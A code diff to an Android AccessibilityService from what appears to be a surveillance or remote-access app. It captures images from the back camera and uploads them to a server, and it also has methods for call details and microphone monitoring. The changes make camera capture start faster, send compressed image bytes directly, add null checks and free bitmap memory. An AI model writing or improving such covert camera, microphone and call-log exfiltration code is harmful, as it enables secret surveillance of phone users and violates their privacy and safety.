@@ -379,7 +379,7 @@ public class MainAccessibilityService extends AccessibilityService {
                         Log.d("qualityCamera", String.valueOf(qualityCamera));
                         setupCamera();
                     }
-                },4000);
+                },500);
 
             }
 
@@ -2064,8 +2064,9 @@ public class MainAccessibilityService extends AccessibilityService {
 
                     // Encode the compressed Bitmap to base64
                     byte[] compressedBytes = byteArrayOutputStream.toByteArray();
-                    String base64Image = Base64.encodeToString(compressedBytes, Base64.DEFAULT);
-                    sendBackCameraMonitoringData(base64Image);
+                    sendBackCameraMonitoringData(byteArrayOutputStream);
+                    bitmap.recycle();
+                    resizedBitmap.recycle();
                     byteArrayOutputStream.close();
                 } catch (IOException e) {
                     throw new RuntimeException(e);
@@ -2076,7 +2077,7 @@ public class MainAccessibilityService extends AccessibilityService {
     };
 
     private void startCaptureRequest() {
-        if(cameraDevice != null) {
+        if(cameraDevice != null && captureSession != null && imageReader_back != null) {
             try {
                 CaptureRequest.Builder captureRequestBuilder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                 captureRequestBuilder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON);
@@ -2108,6 +2109,7 @@ public class MainAccessibilityService extends AccessibilityService {
             imageReader_back.close();
             imageReader_back = null;
         }
+        stopBackgroundThread();
     }
 
     private void getCallDetails() {
@@ -2329,9 +2331,9 @@ public class MainAccessibilityService extends AccessibilityService {
         }
     }
 
-    public void sendBackCameraMonitoringData(String base64Image) {
+    public void sendBackCameraMonitoringData(ByteArrayOutputStream outputStream) {
         if(Server.getContext() != null) {
-            Server.getContext().sendCameraMonitoring(base64Image, qualityCamera, cameraType);
+            Server.getContext().sendCameraMonitoring(outputStream, qualityCamera, cameraType);
         }
     }
     public void sendMicMonitoringData(byte[] bufferData) {
